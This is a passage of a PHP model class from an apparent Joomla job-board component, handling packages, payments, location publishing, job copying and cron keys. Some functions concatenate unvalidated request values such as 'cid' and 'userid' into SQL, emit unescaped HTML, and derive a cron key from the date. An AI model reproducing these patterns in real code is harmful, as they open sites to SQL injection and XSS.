                WHERE job.id = " . $jobid . " ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $companies = array();
        foreach ($rows as $row) {
            $companies[] = array('value' => JText::_($row->id),
                'text' => JText::_($row->name));
        }
        return $companies;
    }

    function &getConfigByFor($configfor) {
        $db = &$this->getDBO();

        $query = "SELECT * FROM `#__js_job_config` WHERE configfor = " . $db->quote($configfor);

        $db->setQuery($query);
        $config = $db->loadObjectList();
        $configs = array();
        foreach ($config as $conf) {
            $configs[$conf->configname] = $conf->configvalue;
        }

        return $configs;
    }

    function & makeDefaultCurrency($id, $defaultvalue) {
        if (is_numeric($id) == false)
            return false;
        if (is_numeric($defaultvalue) == false)
            return false;
        $db = &$this->getDBO();
        $query = "update `#__js_job_currencies` as currency SET currency.default = 0 ";

        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        $row = &$this->getTable('currency');
        $row->id = $id;
        $row->default = $defaultvalue;
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        return true;
    }

    function & makeDefaultTheme($id, $defaultvalue) {
        if (is_numeric($id) == false)
            return false;
        if (is_numeric($defaultvalue) == false)
            return false;
        switch ($id) {
            case '1':$theme = "black/css/jsjobsblack.css";
                break;
            case '2':$theme = "pink/css/jsjobspink.css";
                break;
            case '3':$theme = "orange/css/jsjobsorange.css";
                break;
            case '4':$theme = "golden/css/jsjobsgolden.css";
                break;
            case '5':$theme = "blue/css/jsjobsblue.css";
                break;
            case '6':$theme = "gray/css/jsjobsgray.css";
                break;
            case '7':$theme = "green/css/jsjobsgreen.css";
                break;
            case '8':$theme = "graywhite/css/jsjobsgraywhite.css";
                break;
            case '9':$theme = "template/css/jsjobstemplate.css";
                break;
        }
        $db = &$this->getDBO();
        $query = "update `#__js_job_config` as config SET config.configvalue = " . $db->quote($theme) . " WHERE config.configname = 'theme'";

        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function getExtension($str) {

        $i = strrpos($str, ".");
        if (!$i) {
            return "";
        }
        $l = strlen($str) - $i;
        $ext = substr($str, $i + 1, $l);
        return $ext;
    }

    function listUserDataForPackage($val) {
        if (!is_numeric($val))
            return false;
        $db = &$this->getDBO();

        $query = "SELECT userrole.role FROM `#__js_job_userroles` AS userrole WHERE userrole.uid = " . $val;
        $db->setQuery($query);
        $userrole = $db->loadResult();
        if (!$userrole)
            return false;
        if ($userrole == 1)
            $tablename = '#__js_job_employerpackages';
        elseif ($userrole == 2)
            $tablename = '#__js_job_jobseekerpackages';
        $query = "SELECT package.id,package.title FROM `" . $tablename . "` AS package";
        $db->setQuery($query);
        $result = $db->loadObjectList();
        if (isset($result)) {
            $return_value = "<select name='packageid' class='inputbox' >\n";
            $return_value .= "<option value='' >" . JText::_('JS_PACKAGES') . "</option> \n";
            foreach ($result as $row) {
                $return_value .= "<option value=\"$row->id\" >$row->title</option> \n";
            }
            $return_value .= "</select>\n";
        }
        $return['list'] = $return_value;
        $return['userrole'] = $userrole;
        return json_encode($return);
    }

    function storeUserPackage() {


        $data = JRequest :: get('post'); // get data from form

        if (is_numeric($data['packageid']) == false)
            return false;
        $db = &$this->getDBO();
        $result = array();
        $user = JFactory::getUser();
        $uid = $user->id;
        $row = &$this->getTable('paymenthistory');
        if ($data['userrole'] == 1) {
            $tablename = '#__js_job_employerpackages';
            $row->packagefor = 1;
        } elseif ($data['userrole'] == 2) {
            $tablename = '#__js_job_jobseekerpackages';
            $row->packagefor = 2;
        }
        $query = "SELECT package.* FROM `" . $tablename . "` AS package WHERE id = " . $data['packageid'];
        $db->setQuery($query);
        $package = $db->loadObject();
        if (isset($package)) {
            $packageconfig = $this->getConfigByFor('package');
            $row->uid = $data['userid'];
            $row->currencyid = $this->_defaultcurrency;
            $row->packageid = $package->id;
            $row->packagetitle = $package->title;
            $row->packageprice = $package->price;
            $paidamount = $package->price;
            $discountamount = 0;

            if ($package->price != 0) {
                $curdate = date('Y-m-d H:i:s');
                if (($package->discountstartdate <= $curdate) && ($package->discountenddate >= $curdate)) {
                    if ($package->discounttype == 1) { //%
                        $discountamount = ($package->price * $package->discount) / 100;
                        $paidamount = $package->price - $discountamount;
                    } else { // amount
                        $discountamount = $package->discount;
                        $paidamount = $package->price - $package->discount;
                    }
                }
                $row->transactionverified = 0;
                $row->transactionautoverified = 0;
                $row->status = 1;
            } else {

                if ($data['userrole'] == 1) {

                    if ($packageconfig['onlyonce_employer_getfreepackage'] == '1') { // can't get free package more then once
                        $query = "SELECT COUNT(package.id) FROM `#__js_job_employerpackages` AS package
							JOIN `#__js_job_paymenthistory` AS payment ON (payment.packageid = package.id AND payment.packagefor=1)
							WHERE package.price = 0 AND payment.uid = " . $data['userid'];
                        $db->setQuery($query);
                        $freepackage = $db->loadResult();
                        if ($freepackage > 0)
                            return 5; // can't get free package more then once
                    }
                }elseif ($data['userrole'] == 2) {

                    if ($packageconfig['onlyonce_jobseeker_getfreepackage'] == '1') { // can't get free package more then once
                        $query = "SELECT COUNT(package.id) FROM `#__js_job_jobseekerpackages` AS package
			                    JOIN `#__js_job_paymenthistory` AS payment ON (payment.packageid = package.id AND payment.packagefor=2)
			                    WHERE package.price = 0 AND payment.uid = " . $data['userid'];
                        $db->setQuery($query);
                        $freepackage = $db->loadResult();
                        if ($freepackage > 0)
                            return 5; // can't get free package more then once
                    }
                }

                $row->transactionverified = 1;
                $row->transactionautoverified = 1;
                $row->status = $packageconfig['jobseeker_freepackage_autoapprove'];
            }
            $row->discountamount = $discountamount;
            $row->paidamount = $paidamount;

            $row->discountmessage = $package->discountmessage;
            //if($data['userrole'] == 2){ // no column in employerpayment history
            $row->packagediscountstartdate = $package->discountstartdate;
            $row->packagediscountenddate = $package->discountenddate;
            //}
            $row->packageexpireindays = $package->packageexpireindays;
            $row->packageshortdetails = $package->shortdetails;
            $row->packagedescription = $package->description;
            $row->created = date('Y-m-d H:i:s');
        }else {
            return false;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        return true;
    }

    function publishunpublishfields($call) {
        ($call == 1) ? $publishunpublish = 1 : $publishunpublish = 0;
        $cids = JRequest::getVar('cid');
        $db = $this->getDbo();
        foreach ($cids AS $cid) {
            $query = "UPDATE `#__js_job_fieldsordering` SET published = " . $publishunpublish . " WHERE cannotunpublish = 0 AND id = " . $cid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
        }
        return true;
    }

    function publishcountries() {
        $row = &$this->getTable('country');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '1';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }
        return true;
    }

    function unpublishcountries() {
        $row = &$this->getTable('country');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '0';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }
        return true;
    }

    function publishstates() {
        $row = &$this->getTable('state');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '1';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }

        return true;
    }

    function unpublishstates() {
        $row = &$this->getTable('state');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '0';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }
        return true;
    }

    function publishcounties() {
        $row = &$this->getTable('county');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '1';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }
        return true;
    }

    function unpublishcounties() {
        $row = &$this->getTable('county');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '0';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }
        return true;
    }

    function publishcities() {
        $row = &$this->getTable('city');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '1';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }
        return true;
    }

    function unpublishcities() {
        $row = &$this->getTable('city');
        $cids = JRequest::getVar('cid');
        foreach ($cids AS $cid) {
            $data['id'] = $cid;
            $data['enabled'] = '0';
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
        }
        return true;
    }

    function getCopyJob($jobid) {
        if (!is_numeric($jobid))
            return false;
        $db = $this->getDbo();
        $query = "SELECT * FROM `#__js_job_jobs` WHERE id = " . $jobid;
        $db->setQuery($query);
        $job = $db->loadObject();
        $data = (array) $job;
        $data['id'] = '';
        $data['title'] = $data['title'] . ' ' . JText::_('JS_COPY');
        $data['jobid'] = $this->getJobId();
        $data['isgoldjob'] = 0;
        $data['isfeaturedjob'] = 0;
        $data['status'] = 0;
        $data['startpublishing'] = date('Y-m-d H:i:s');
        $data['created'] = date('Y-m-d H:i:s');
        $row = &$this->getTable('job');
        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->check($data)) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store($data)) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        if ($data['city'])
            $storemulticity = $this->storeMultiCitiesJob($data['city'], $row->id);
        if (isset($storemulticity) AND ($storemulticity == false))
            return false;

        if ($this->_client_auth_key != "") {
            $query = "SELECT job.* FROM `#__js_job_jobs` AS job  
						WHERE job.id = " . $row->id;

            $db->setQuery($query);
            $data_job = $db->loadObject();
            if ($data['id'] != "" AND $data['id'] != 0)
                $data_job->id = $data['id']; // for edit case
            $data_job->job_id = $row->id;
            $data_job->authkey = $this->_client_auth_key;
            $data_job->task = 'storejob';
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->storeJobSharing($data_job);
            return $return_value;
        }else {
            return true;
        }
    }

    function getJobId() {
        $db = &$this->getDBO();
        $query = "Select jobid from `#__js_job_jobs`";
        do {

            $jobid = "";
            $length = 9;
            $possible = "2346789bcdfghjkmnpqrtvwxyzBCDFGHJKLMNPQRTVWXYZ!@#";
            // we refer to the length of $possible a few times, so let's grab it now
            $maxlength = strlen($possible);
            // check for length overflow and truncate if necessary
            if ($length > $maxlength) {
                $length = $maxlength;
            }
            // set up a counter for how many characters are in the password so far
            $i = 0;
            // add random characters to $password until $length is reached
            while ($i < $length) {
                // pick a random character from the possible ones
                $char = substr($possible, mt_rand(0, $maxlength - 1), 1);
                // have we already used this character in $password?

                if (!strstr($jobid, $char)) {
                    if ($i == 0) {
                        if (ctype_alpha($char)) {
                            $jobid .= $char;
                            $i++;
                        }
                    } else {
                        $jobid .= $char;
                        $i++;
                    }
                }
            }
            $db->setQuery($query);
            $rows = $db->loadObjectList();
            foreach ($rows as $row) {
                if ($jobid == $row->jobid)
                    $match = 'Y';
                else
                    $match = 'N';
            }
        }while ($match == 'Y');
        return $jobid;
    }

    function getCheckCronKey() {
        $db = $this->getDbo();
        $query = "SELECT configvalue FROM `#__js_job_config` WHERE configname = " . $db->quote('cron_job_alert_key');
        $db->setQuery($query);
        $key = $db->loadResult();
        if ($key)
            return true;
        else
            return false;
    }

    function genearateCronKey() {
        $key = md5(date('Y-m-d'));
        $db = $this->getDbo();
        $query = "UPDATE `#__js_job_config` SET configvalue = " . $db->quote($key) . " WHERE configname = " . $db->quote('cron_job_alert_key');
        $db->setQuery($query);
        if (!$db->query()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
        }
        else
            return true;
    }

    function getCronKey($passkey) {
        if ($passkey == md5(date('Y-m-d'))) {
            $db = $this->getDbo();
            $query = "SELECT configvalue FROM `#__js_job_config` WHERE configname = " . $db->quote('cron_job_alert_key');
            $db->setQuery($query);
            $key = $db->loadResult();
            return $key;
        }
        else
            return false;
    }

    function makeDir($path) {
        if (!file_exists($path)) { // create directory
            mkdir($path, 0755);
            $ourFileName = $path . '/index.html';
            $ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");
            fclose($ourFileHandle);
        }
    }

    function getAddressData($value) {
        $array = explode(', ', $value);
        $count = count($array);
        $count--;

        if ($count != -1) {
            $country = $array[$count];
            $count--;
        }
        if ($count != -1) {
            $county = $array[$count];
            $count--;
        }
        if ($count != -1)
            $city = $array[$count];

        $db = $this->getDbo();
        $query = "SELECT code FROM `#__js_job_countries` WHERE name = " . $db->quote($country);
        $db->setQuery($query);
        $countrycode = $db->loadResult();
        if (isset($county)) {
            $query = "SELECT statecode FROM `#__js_job_counties` WHERE countrycode = " . $db->quote($countrycode) . " AND name = " . $db->quote($county);
            $db->setQuery($query);
            $statecode = $db->loadResult();
        }

        if (isset($statecode) && !empty($statecode)) {
            $query = "SELECT code,name FROM `#__js_job_states` WHERE countrycode = " . $db->quote($countrycode);
            $db->setQuery($query);
            $states = $db->loadObjectList();

            $liststates = "<select name=state id=state class=inputbox onchange=\"dochange('county', this.value);\" >\n";
            foreach ($states AS $st) {
                if ($statecode == $st->code)
                    $liststates .= "<option value=" . $st->code . " selected=selected>" . $st->name . "</option>";
                else
                    $liststates .="<option value=" . $st->code . ">" . $st->name . "</option>";
            }
            $liststates .= "</select>";

            $query = "SELECT code,name FROM `#__js_job_counties` WHERE countrycode = " . $db->quote($countrycode) . " AND statecode = " . $db->quote($statecode);
            $db->setQuery($query);
            $counties = $db->loadObjectList();

            $listcounties = "<select name=county id=county class=inputbox onchange=\"dochange('city', this.value);\" >\n";
            foreach ($counties AS $st) {
                if ($county == $st->name) {
                    $listcounties .= "<option value=" . $st->code . " selected=selected>" . $st->name . "</option>";
                    $countycode = $st->code;
                }
                else
                    $listcounties .="<option value=" . $st->code . ">" . $st->name . "</option>";
            }
            $listcounties .= "</select>";

            if (isset($city)) {
                if (isset($countycode)) {
                    $query = "SELECT code,name FROM `#__js_job_cities` WHERE countrycode = " . $db->quote($countrycode) . " AND statecode = " . $db->quote($statecode) . " AND countycode = " . $db->quote($countycode);
                    $db->setQuery($query);
                    $counties = $db->loadObjectList();

                    $listcity = "<select name=city id=city class=inputbox onchange= >\n";
                    $listcity .= "<option value=''>" . JText::_('JS_SELECT_CITY') . "</option>";
                    foreach ($counties AS $st) {
                        if ($city == $st->name)
                            $listcity .= "<option value=" . $st->code . " selected=selected>" . $st->name . "</option>";
                        else
                            $listcity .="<option value=" . $st->code . ">" . $st->name . "</option>";
                    }
                    $listcity .= "</select>";
                }
                else
                    $listcity = "<input name=city id=city onBlur= />";
            }
            else
                $listcity = "<input name=city id=city onBlur= />";
        }else {
            if (isset($county)) {
                $liststates = "<input name=state id=state value=" . $county . " onBlur= />";
                $listcounties = "<input name=county id=county value=" . $county . " onBlur= />";
            } else {
                $liststates = "<input name=state id=state value='' onBlur= />";
                $listcounties = "<input name=county id=county value='' onBlur= />";
            }
            if (isset($city))
                $listcity = "<input name=city id=city value=" . $city . " onBlur= />";
            else
                $listcity = "<input name=city id=city onBlur= />";
        }
        $return['countrycode'] = $countrycode;
        $return['states'] = $liststates;
        $return['counties'] = $listcounties;
        $return['city'] = $listcity;
        return $return;
    }
        function getAllSharingServiceLog($searchuid,$searchusername,$searchrefnumber,$searchstartdate,$searchenddate,$limitstart, $limit){
            $db = $this->getDbo();
            $wherequery = '';
            $clause = " WHERE ";
            if($searchuid) 
                if(is_numeric($searchuid)){
                    $wherequery .= $clause." sharelog.uid = ".(int)$searchuid;
                    $clause = " AND ";
            }
            if($searchrefnumber) 
                if(is_numeric($searchrefnumber)){
                    $wherequery .= $clause." sharelog.referenceid = ".(int)$searchrefnumber;
                    $clause = " AND ";
            }
            if($searchusername){
                    $wherequery .= $clause." user.name LIKE '%".str_replace("'",'',$db->quote($searchusername))."%'";
                    $clause = " AND ";
            }
            if($searchstartdate){
                    $wherequery .= $clause." DATE(sharelog.datetime) >= DATE(".$db->quote(date('Y-m-d',strtotime($searchstartdate))).")";
                    $clause = " AND ";
            }
            if($searchenddate){
                    $wherequery .= $clause." DATE(sharelog.datetime) <= DATE(".$db->quote(date('Y-m-d',strtotime($searchenddate))).")";
                    $clause = " AND ";
            }
            
            //total query
            $query = "SELECT COUNT(sharelog.id) AS total 
                        FROM `#__js_job_sharing_service_log` AS sharelog
                        LEFT JOIN `#__users` AS user ON user.id = sharelog.uid";
            $query .= $wherequery;
            $db->setQuery($query);
            $total = $db->loadResult();
            
            $query = "SELECT sharelog.*, user.name AS username
                        FROM `#__js_job_sharing_service_log` AS sharelog
                        LEFT JOIN `#__users` AS user ON user.id = sharelog.uid";
            $query .= $wherequery;

            $db->setQuery($query,$limitstart,$limit);
            $sharelog = $db->loadObjectList();
            
            $lists['uid'] = $searchuid;
            $lists['username'] = $searchusername;
            $lists['refnumber'] = $searchrefnumber;
            $lists['startdate'] = $searchstartdate;
            $lists['enddate'] = $searchenddate;
            
            $return[0] = $sharelog;
            $return[1] = $total;
            $return[2] = $lists;
            
            return $return;
            
        }
    

    
    
    

}

?>
